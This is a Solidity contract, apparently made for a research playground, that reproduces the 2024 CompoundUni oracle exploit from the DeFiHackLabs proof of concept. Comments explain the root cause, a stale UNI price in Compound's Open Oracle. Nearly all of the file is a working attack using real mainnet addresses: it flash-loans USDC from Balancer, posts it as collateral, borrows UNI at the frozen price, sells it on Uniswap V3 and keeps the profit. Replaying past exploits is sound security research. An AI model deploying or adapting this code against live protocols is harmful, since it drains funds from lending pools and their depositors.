// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-CompoundUni).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the Balancer flash-loan callback `receiveFlashLoan`
// and the Uniswap V3 swap callback `uniswapV3SwapCallback` both live on the test
// itself), so there is no standalone contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack (testExploit ->
// receiveFlashLoan -> uniswapV3SwapCallback) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/CompoundUni_exp.sol.
//
// Root cause: Compound v2's Open Oracle (UniswapAnchoredView) stores a
// per-symbol price with no freshness/staleness field. The UNI reporter stopped
// posting, freezing prices[UNI].price stale-low relative to the live Uniswap V3
// market. borrowAllowed()/getAccountLiquidity() trust that frozen price, so the
// attacker borrows far more UNI than their collateral would justify at the real
// market price, dumps it on Uniswap V3 for the true price, and repays the flash
// loan while keeping the spread.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface ICompoundcUSDC {
    function mint(uint256 mintAmount) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface IcUniToken {
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IUNIV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes memory data)
        external
        returns (int256 amount0, int256 amount1);
}

interface IUNI {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function transfer(address dst, uint256 rawAmount) external returns (bool);
}

interface IWETH {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address dst, uint256 rawAmount) external returns (bool);
}

interface IUniswapAnchoredView {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

contract CompoundUniDrain {
    IBalancerVault public vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICompoundcUSDC public cUSDC = ICompoundcUSDC(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    IComptroller public comptroller = IComptroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IcUniToken public cUniToken = IcUniToken(0x35A18000230DA775CAc24873d00Ff85BccdeD550);
    IUNIV3Pool public UNI_WETH_Pool = IUNIV3Pool(0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801);
    IUNI public uni = IUNI(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IUNIV3Pool public WETH_USDC_Pool = IUNIV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IWETH public WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapAnchoredView public UniswapAnchoredView = IUniswapAnchoredView(0x50ce56A3239671Ab62f185704Caedf626352741e);

    uint256 public AMOUNT = 193_020_254_960;
    uint256 public num = 0;

    // step 0: flash-loan USDC from Balancer; receiveFlashLoan() does the rest.
    function run() external {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(USDC);
        amounts[0] = AMOUNT;
        vault.flashLoan(address(this), tokens, amounts, bytes(""));
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        // step 1: pledge the flash-loaned USDC as Compound collateral.
        USDC.approve(address(cUSDC), AMOUNT);
        cUSDC.mint(AMOUNT);
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(cUSDC);
        comptroller.enterMarkets(cTokens);

        // step 2: read borrow capacity computed off the stale, frozen UNI oracle price.
        (, uint256 myTotalLiquidity,) = comptroller.getAccountLiquidity(address(this));

        // step 3: the max amount of UNI we can borrow = AccountLiquidity / UNI's stale price in compound
        uint256 max_UNI_borrow =
            myTotalLiquidity / UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 10 ** uni.decimals();
        cUniToken.borrow(max_UNI_borrow);

        // step 4: sell the discounted UNI at its true market price via UNI => WETH => USDC.
        UNI_WETH_Pool.swap(address(this), true, int256(uni.balanceOf(address(this))), 42_095_128_740, bytes(""));
        WETH_USDC_Pool.swap(
            address(this),
            false,
            int256(WETH.balanceOf(address(this))),
            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,
            bytes("")
        );

        // step 5: repay the flash loan; the remaining USDC is the atomic profit.
        USDC.transfer(msg.sender, AMOUNT);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) public {
        // For the twice swap()
        if (num == 0) {
            uni.transfer(msg.sender, uint256(amount0Delta));
            num++;
        } else {
            WETH.transfer(msg.sender, uint256(amount1Delta));
        }
    }
}
